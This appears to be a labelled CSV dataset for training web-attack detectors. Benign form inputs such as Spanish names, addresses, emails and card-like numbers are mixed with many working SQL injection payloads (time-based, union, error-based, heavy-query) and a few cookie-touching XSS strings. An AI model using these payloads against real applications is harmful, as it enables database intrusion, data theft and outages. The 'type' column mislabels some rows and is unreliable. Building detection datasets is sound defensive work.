Text,attack_type,Label,type
urdiales del pramo,norm,0,normal
49718,norm,0,normal
"-3555') or make_set(9354=9354,7185) and ('papr'='papr",sqli,1,normal
"pasaje maria merida s/n, 4?h",norm,0,normal
lock,norm,0,normal
"1)) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((6829=6829",sqli,1,normal
jaworsky,norm,0,normal
rumsey@ubikuo.coop,norm,0,normal
butkus@cpanelhost.com.uz,norm,0,normal
corulln,norm,0,normal
26707809w,norm,0,normal
"1%"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""%""=""",sqli,1,normal
99508422a,norm,0,normal
sintes novoa,norm,0,normal
rurick5,norm,0,normal
"carretera ribas matama 160,",norm,0,normal
"1"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ""eiuc"" like ""eiuc",sqli,1,sql
mortensen@look2fly.nr,norm,0,normal
"calle juan de mena, 133",norm,0,normal
2mpav8nar,norm,0,normal
miron,norm,0,normal
20709,norm,0,normal
"calle montesol 30,",norm,0,normal
"1'+(select qmez where 3729=3729 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1) as ptxw where 9873=9873;begin dbms_lock.sleep(5); end--,sqli,1,sql
"urbanizacion barrio ledesma, 180,",norm,0,normal
"1'+(select 'mtpt' where 7483=7483 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
contreras,norm,0,normal
45,norm,0,normal
"1 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,normal
7919,norm,0,normal
"1'+(select 'zkum' where 5161=5161 union all select null,null,null,null#",sqli,1,sql
"1""))) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1%') or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
albillos,norm,0,normal
339a.redo,norm,0,normal
42101588l,norm,0,normal
"1'||(select 'uusj' where 2149=2149 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",sqli,1,sql
"1'||(select 'vekn' from dual where 4929=4929 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))||'",sqli,1,sql
43120,norm,0,normal
shdanoff@esposo.com.tj,norm,0,normal
36668,norm,0,normal
morneau,norm,0,normal
46819300v,norm,0,normal
"c/ melilla, 149,",norm,0,normal
almaraz,norm,0,normal
"calle juan sitges 24,",norm,0,normal
"-5230"") or elt(1032=1032,3623) and (""aivb"" like ""aivb",sqli,1,normal
"1') where 1363=1363;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
p5li8e5i2,norm,0,normal
"1"" where 2204=2204 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"calle miquel santandreu 66,",norm,0,normal
"1%')) union all select null,null,null--",sqli,1,sql
12269719r,norm,0,normal
"1) as ujjg where 3125=3125 union all select null,null,null,null,null,null#",sqli,1,sql
"1) where 5333=5333 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
quilley0@frenchpolynesia.com.st,norm,0,normal
69409914p,norm,0,normal
miramar,norm,0,normal
vallibona,norm,0,normal
c/ rio elorz 141 11-h,norm,0,normal
"-1302"")) as rshr where 2800=2800 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
"1') and elt(4249=4249,7259)",sqli,1,normal
">""<body onload=""document.cookie=true;"">",xss,2,xss
"<link rel=""stylesheet"" href=""javascript:alert('crosssitescripting');"">",xss,2,xss
"1) and 3824=benchmark(5000000,md5(0x76555642)) and (6786=6786",sqli,1,normal
"-4527' union all select 7115,7115#",sqli,1,sql
"sagrada familia 124, 5?b",norm,0,normal
"1')) as babx where 2494=2494 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
1 where 5700=5700;select pg_sleep(5)--,sqli,1,sql
"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",sqli,1,sql
17739088q,norm,0,normal
9ein6e0a3,norm,0,normal
46415307l,norm,0,normal
llanera,norm,0,normal
gramajo,norm,0,normal
filis,norm,0,normal
strucak@cortell.cat,norm,0,normal
elian,norm,0,normal
reth,norm,0,normal
08520,norm,0,normal
"1' in boolean mode) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)#",sqli,1,sql
"1) union all select null,null#",sqli,1,sql
"1"")) as ylah where 9248=9248;select pg_sleep(5)--",sqli,1,sql
"don quijote 81,",norm,0,normal
slavova@costablancarental.ug,norm,0,normal
1') as rbpx where 1264=1264;begin dbms_lock.sleep(5); end--,sqli,1,sql
abogada,norm,0,normal
4713791605534130,norm,0,normal
torrescrcela,norm,0,normal
"calle de piquer, 8,",norm,0,normal
"1%') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('%'='",sqli,1,sql
"espronceda, 174 12-e",norm,0,normal
milara kirkpatrick,norm,0,normal
calle arroyo de los angeles 180,norm,0,normal
"-6095"")) as kgfp where 3601=3601 or 7287=9373#",sqli,1,normal
"1%"")) union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
66226006j,norm,0,normal
angilberto,norm,0,normal
"1%"" union all select null,null,null,null,null,null,null--",sqli,1,sql
"1'||(select 'uqbj' from dual where 6736=6736 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",sqli,1,normal
"-3130'))) union all select 2886,2886,2886,2886,2886,2886,2886#",sqli,1,sql
9032865306182152,norm,0,normal
"1%"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ""%""=""",sqli,1,sql
c/ san mariano 168,norm,0,normal
sevilla,norm,0,normal
"1%')) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
1 rlike sleep(5)#,sqli,1,normal
"-2211"" or 2113=8885#",sqli,1,normal
91309762s,norm,0,normal
-8007')) as bgpp where 9555=9555 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
cantiveros,norm,0,normal
-7720)) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((8254=8254,sqli,1,sql
c7ada98o,norm,0,normal
betty,norm,0,normal
adoro,norm,0,normal
31271,norm,0,normal
"1) where 3915=3915 union all select null,null,null,null#",sqli,1,sql
5290,norm,0,normal
"-9929') as gbtc where 8162=8162 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
vieta,norm,0,normal
simonne,norm,0,normal
santa eufemia del arroyo,norm,0,normal
"1"") where 1833=1833;select (case when (3344=8103) then 3344 else 1/(select 0) end)--",sqli,1,sql
mari cielo,norm,0,normal
1)) and 2006=2006,sqli,1,normal
germe,norm,0,normal
zulaica,norm,0,normal
aguaviento,norm,0,normal
44143,norm,0,normal
6679885410766577,norm,0,normal
"orellana, 98,",norm,0,normal
"-3326'+(select xitp where 7621=7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",sqli,1,sql
">""<a href=""javascript#document.cookie=true;"">",xss,2,sql
kamel@hiperespaa.hk,norm,0,normal
nys,norm,0,normal
1 where 5443=5443;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
"1));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
estamariu,norm,0,normal
"-6431"")) union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#",sqli,1,sql
18iangu7ada,norm,0,normal
-8745') as xpwv where 8855=8855 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
9303943122471890,norm,0,normal
4347901737228358,norm,0,normal
14399392n,norm,0,normal
-1021) as erjh where 7845=7845 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
"-9439"") where 9460=9460 or (9497=9586)*9586--",sqli,1,sql
"-7433"")) as zsnt where 2513=2513 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli,1,sql
"1"")) as czzg where 5483=5483 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1,sql
houstin@maxitienda.zr,norm,0,normal
hrdata,norm,0,normal
"1%"")) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
frankos,norm,0,normal
"1"";select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",sqli,1,sql
57764889k,norm,0,normal
lana,norm,0,normal
1)) as pynj where 7683=7683 waitfor delay '0:0:5'--,sqli,1,sql
sol,norm,0,normal
"1"")) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
rattenbury_roquette@ibizasounds.gh,norm,0,normal
mccaffrie@alcantarapartners.ir,norm,0,normal
cleofs,norm,0,normal
"1') or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
1' union all select null--,sqli,1,sql
balcom,norm,0,normal
gastn,norm,0,normal
rozaln del monte,norm,0,normal
campanario,norm,0,normal
yaci,norm,0,normal
52323114t,norm,0,normal
"1');select benchmark(5000000,md5(0x4c4d6142))",sqli,1,sql
descolocado,norm,0,normal
bordin,norm,0,normal
rowen,norm,0,normal
7688901932687073,norm,0,normal
"1);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
dahlke8@elviajehacomenzado.sv,norm,0,normal
"1' in boolean mode) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)#",sqli,1,normal
athony,norm,0,normal
elwira,norm,0,normal
20048048y,norm,0,normal
"1"") as xioc where 7260=7260 or elt(5873=5873,sleep(5))#",sqli,1,normal
18311,norm,0,normal
"1 where 6095=6095 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
9543684554655455,norm,0,normal
antai,norm,0,normal
argamasilla de calatrava,norm,0,normal
"1%"")) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
9528500439395561,norm,0,normal
9289,norm,0,normal
"1"" rlike (select (case when (3711=3313) then 1 else 0x28 end)) and ""iqlh"" like ""iqlh",sqli,1,sql
"1%'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
calle horreo 85 10?d,norm,0,normal
"-7171%')) union all select 5580,5580,5580,5580,5580,5580,5580,5580--",sqli,1,sql
concluir,norm,0,normal
"buidaoli, 49, 12-g",norm,0,normal
"urbanitzacio las lomas, 18, 4a",norm,0,normal
"calle santa escolastica, 184",norm,0,normal
0oll10n,norm,0,normal
"-6368' union all select 6529,6529,6529--",sqli,1,sql
"1') where 5071=5071 union all select null,null,null,null,null,null,null--",sqli,1,sql
gabriele,norm,0,normal
"1);call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"<? echo('<scr)';echo('ipt>alert(""xss"")</script>'); ?>",xss,2,xss
36746323m,norm,0,normal
*r6t58a,norm,0,normal
"1 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)-- cbsd",sqli,1,sql
"-3343'||(select 'ssvt' where 5179=5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",sqli,1,sql
cal5br2,norm,0,normal
"1%"");select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (""%""=""",sqli,1,sql
"1 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
mazanett crdoba,norm,0,normal
brana@housemovie.id,norm,0,normal
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
4a39c44a,norm,0,normal
bergamasco privado,norm,0,normal
garroch_ista,norm,0,normal
"carlos arniches 78,",norm,0,normal
1'))) and 6969=(select 6969 from pg_sleep(5)) and ((('ineq' like 'ineq,sqli,1,sql
massie.borionko@13horas.gr,norm,0,normal
1) where 3381=3381 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
"c/ gustavo adolfo becquer 91,",norm,0,normal
"1"")) as tmpz where 7224=7224 and make_set(3579=1045,1045)--",sqli,1,sql
gormaz schneider,norm,0,normal
mataronesa,norm,0,normal
17120,norm,0,normal
"c/ princesa guajara, 95 13?e",norm,0,normal
8837,norm,0,normal
tchistyakov-linn-baker@pool-control.tw,norm,0,normal
21959527r,norm,0,normal
"1' in boolean mode) and elt(3114=3114,sleep(5))#",sqli,1,normal
tiege.comptom@informatica2009.cv,norm,0,normal
vicente cornell,norm,0,normal
rapariegos,norm,0,normal
"1""))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""htyi""=""htyi",sqli,1,normal
86090489v,norm,0,normal
emmersto,norm,0,normal
"1' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'bkcs'='bkcs",sqli,1,normal
1') as ibaw where 2130=2130 and 9198=9198--,sqli,1,sql
ingenio,norm,0,normal
"(select * from generate_series(4990,4990,case when (4990=5065) then 1 else 0 end) limit 1)",sqli,1,sql
c!huzar,norm,0,normal
albicio,norm,0,normal
4592439732004751,norm,0,normal
1%') and (select * from (select(sleep(5)))fzno) and ('%'=',sqli,1,sql
2435495115803768,norm,0,normal
"1%' and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"-1802%')) union all select 1002,1002,1002,1002,1002,1002,1002#",sqli,1,sql
"1)) as dqfl where 7527=7527;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
bijman3,norm,0,normal
guillermina,norm,0,normal
solicitador,norm,0,normal
"obispo diego aponte, s/n",norm,0,normal
2797487498491487,norm,0,normal
"1'||(select 'boib' where 9595=9595;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
1269522049567133,norm,0,normal
ibazeta montells,norm,0,normal
"1%"") or 8421=(select count(*) from generate_series(1,5000000)) and (""%""=""",sqli,1,sql
"-6803"") order by 1#",sqli,1,normal
salas solmoirago,norm,0,normal
"1"") and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""ccuy""=""ccuy",sqli,1,sql
"1""))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((""fpkm"" like ""fpkm",sqli,1,normal
segovia,norm,0,normal
81784894e,norm,0,normal
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('qomf' like 'qomf",sqli,1,sql
1;waitfor delay '0:0:5'# ogzq,sqli,1,sql
14724400f,norm,0,normal
la,norm,0,normal
"1)) as fynx where 9636=9636 union all select null,null,null,null,null--",sqli,1,sql
-3613%') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('%'=',sqli,1,sql
"1%"" or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ""%""=""",sqli,1,sql
41420,norm,0,normal
nasit_barscha@cortinas-de-aire.eh,norm,0,normal
serneo,norm,0,normal
cushing_borges8@sitcpla.qa,norm,0,normal
"(select (case when (1938=1938) then dbms_pipe.receive_message(chr(118)||chr(118)||chr(112)||chr(76),5) else 1938 end) from dual)",sqli,1,sql
8084984128679341,norm,0,normal
c742na79,norm,0,normal
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"-2384'||(select 'vhcp' from dual where 1266=1266 union all select 1266,1266,1266,1266--",sqli,1,sql
"1"")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""fuus"" like ""fuus",sqli,1,sql
"1"" where 3510=3510;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1"";select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
atontamiento,norm,0,normal
"-3781) union all select 3916,3916,3916--",sqli,1,sql
san vicente de la cabeza,norm,0,normal
5564897923459190,norm,0,normal
4468134074591535,norm,0,normal
-2372' or 1783=2656,sqli,1,normal
82634246f,norm,0,normal
llovet,norm,0,normal
1%') and 8734=5844,sqli,1,normal
-8519%')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('%'=',sqli,1,sql
38348614r,norm,0,normal
"1' where 6963=6963 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"1'||(select 'gtri' from dual where 7097=7097 and elt(1210=1210,sleep(5)))||'",sqli,1,sql
4626512497808574,norm,0,normal
11039917d,norm,0,normal
santiso,norm,0,normal
curley.majurec@ajuntamentbarcelona2-0.gi,norm,0,normal
czarevitz,norm,0,normal
-1549') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('fnwx'='fnwx,sqli,1,sql
-1<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>,xss,2,sql
eu6eo,norm,0,normal
8451,norm,0,normal
atractivo,norm,0,normal
26325,norm,0,normal
falicov,norm,0,normal
1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('kkgt'='kkgt,sqli,1,sql
44651,norm,0,normal
macready-vlaenderen3@citycvs.tr,norm,0,normal
"1"") as drrx where 8633=8633 union all select null,null,null--",sqli,1,sql
dositeo,norm,0,normal
carrer sant joan de deu 186,norm,0,normal
"1) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (6690=6690",sqli,1,sql
"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('ibrj'='ibrj",sqli,1,sql
obolensky@etnics.hr,norm,0,normal
18858,norm,0,normal
molina de aragn,norm,0,normal
"-2453"") union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",sqli,1,sql
8914644367191799,norm,0,normal
"-4406%' union all select 9599,9599,9599,9599#",sqli,1,sql
fabien,norm,0,normal
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'='qipt",sqli,1,sql
1) rlike (select (case when (5477=7492) then 1 else 0x28 end)) and (4427=4427,sqli,1,sql
"1') as mara where 7164=7164;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
3628286866594079,norm,0,normal
07441681p,norm,0,normal
4436070714409479,norm,0,normal
ballonga,norm,0,normal
"-5661')) union all select 3011,3011#",sqli,1,sql
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('tnfm' like 'tnfm",sqli,1,sql
8112463207764255,norm,0,normal
"exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*"");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>",xss,2,sql
santibez de bjar,norm,0,normal
4973,norm,0,normal
floreal,norm,0,normal
"-5524) as eoyk where 6928=6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",sqli,1,sql
53,norm,0,normal
1'||(select 'vwls' where 5252=5252 rlike sleep(5)#,sqli,1,sql
1');select (case when (2968=2021) then 1 else 2968*(select 2968 from master..sysdatabases) end)--,sqli,1,sql
"1"")) as swwb where 4244=4244;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"-7313"") where 3606=3606 union all select 3606#",sqli,1,sql
berto,norm,0,normal
"1'+(select ouhd where 8905=8905 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'",sqli,1,sql
mucientes,norm,0,normal
"c/ juan luis peralta, 49 13-f",norm,0,normal
"1"")) as ftts where 3671=3671 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
antanas,norm,0,normal
linares barreras,norm,0,normal
"-5054%""))) union all select 8263,8263,8263,8263--",sqli,1,sql
"1'+(select 'vedi' where 2774=2774 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1"")) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""dacx""=""dacx",sqli,1,sql
maycel,norm,0,normal
berval.kazem@provider.com.sj,norm,0,normal
gratallops,norm,0,normal
9nte0uer3o,norm,0,normal
7340868794672217,norm,0,normal
5211,norm,0,normal
"1' in boolean mode) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
6ilia+ria,norm,0,normal
ocaa,norm,0,normal
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('xgzb'='xgzb",sqli,1,sql
"1' and 3824=benchmark(5000000,md5(0x76555642)) and 'vmuj' like 'vmuj",sqli,1,normal
48898173n,norm,0,normal
"-8448%"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""%""=""",sqli,1,sql
putman,norm,0,normal
"-5637%""))) or 6872=6872 and (((""%""=""",sqli,1,normal
ad5ma.sc9r,norm,0,normal
nanni-prucnal@fighting-machines.gf,norm,0,normal
"1) where 5234=5234 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
casanova dot,norm,0,normal
kempler7,norm,0,normal
52031263l,norm,0,normal
hilburn@sanchezgordo.es,norm,0,normal
97233442e,norm,0,normal
1342i3,norm,0,normal
septimio,norm,0,normal
8407,norm,0,normal
kangning,norm,0,normal
julisa,norm,0,normal
"rinconada de la sierra, la",norm,0,normal
"1%"" order by 1#",sqli,1,normal
ilijev@mauroman.tc,norm,0,normal
querol jopia,norm,0,normal
1') as imgv where 7802=7802;select (case when (9619=8679) then 1 else 9619*(select 9619 from master..sysdatabases) end)--,sqli,1,sql
zaharoff0,norm,0,normal
valencina de la concepcin,norm,0,normal
"1%"") and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""%""=""",sqli,1,sql
particular teresa orozco 101,norm,0,normal
06434691g,norm,0,normal
1254,norm,0,normal
"1)) as vzso where 8541=8541 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
">""</title><script>document.cookie=true;</script>",xss,2,xss
calleja,norm,0,normal
gorius,norm,0,normal
albina,norm,0,normal
1));if(2643=1393) select 2643 else drop function nqss--,sqli,1,sql
40171,norm,0,normal
schonhals-lackteen@opel-e-flex.af,norm,0,normal
1')) as iuta where 1482=1482;waitfor delay '0:0:5'--,sqli,1,sql
"calle jose canovas pujante, 106 8g",norm,0,normal
"1 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)-- ctdx",sqli,1,sql
satoh,norm,0,normal
"avenida espaa, 14, 1f",norm,0,normal
nonaspe,norm,0,normal
doa,norm,0,normal
entendimiento,norm,0,normal
parcent,norm,0,normal
"-3441')) as dxvt where 9291=9291 union all select 9291,9291,9291#",sqli,1,sql
2,norm,0,normal
janga7a,norm,0,normal
jasmann,norm,0,normal
druci,norm,0,normal
"1 union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1%""))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
lcar,norm,0,normal
"1')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('mttj' like 'mttj",sqli,1,sql
"1"");select (case when (4043=5276) then 4043 else 4043*(select 4043 from information_schema.character_sets) end)#",sqli,1,sql
ardavan,norm,0,normal
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('xlvt'='xlvt",sqli,1,sql
"c/ afrodita 160, 5?b",norm,0,normal
1' where 8099=8099;waitfor delay '0:0:5'--,sqli,1,sql
rei1@rtce.au,norm,0,normal
4282,norm,0,normal
jandtegui curell,norm,0,normal
7542,norm,0,normal
von_semm,norm,0,normal
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('yaml'='yaml",sqli,1,sql
"1"");begin user_lock.sleep(5); end--",sqli,1,sql
